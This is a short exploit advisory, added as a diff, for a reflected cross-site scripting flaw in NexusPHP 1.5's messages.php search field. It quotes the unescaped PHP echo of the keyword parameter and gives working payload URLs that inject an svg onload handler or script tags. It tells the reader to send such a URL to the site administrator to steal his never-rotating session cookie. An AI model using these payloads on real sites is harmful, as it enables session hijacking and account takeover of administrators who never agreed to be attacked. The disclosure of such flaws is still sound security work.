@@ -1,0 +1,36 @@
+###########################
+# Powered by C0d3r1iu     #
+# Team:HIT-nslab          #
+# mail:admin@recorday.cn  #
+###########################
+
+===============================================
+
+Send the URL to the web administrator to complete the attack,and you can get the administrator's identity
+
+Affected software: NexusPHP 1.5
+
+
+Software Link: http://sourceforge.net/projects/nexusphp/
+
+===============================================
+
+Source:
+        messages.php:from line 680
+		
+        <input type="hidden" name="action" value="viewmailbox">
+        <?php echo $lang_messages['text_search'] ?>
+        <input id="searchinput" name="keyword" type="text"value="<?php echo $_GET['keyword']?>" style="width: 200px"/>
+
+
+        Affected software: NexusPHP 1.5
+	      Software Link: http://sourceforge.net/projects/nexusphp/
+
+	      Free to modify and redistribute this program.
+	      Use at your own risk and you are responsible for what you are doing.
+
+exploit:
+	      http://localhost/messages.php?keyword="><svg/onload=alert(1)>//
+        http://localhost/messages.php?keyword="> + anyother html tags included <script>
+        when the admin view this page,we can get his cookie, by the design of this software,the
+        cookie never be changed if users hasn't change their password.
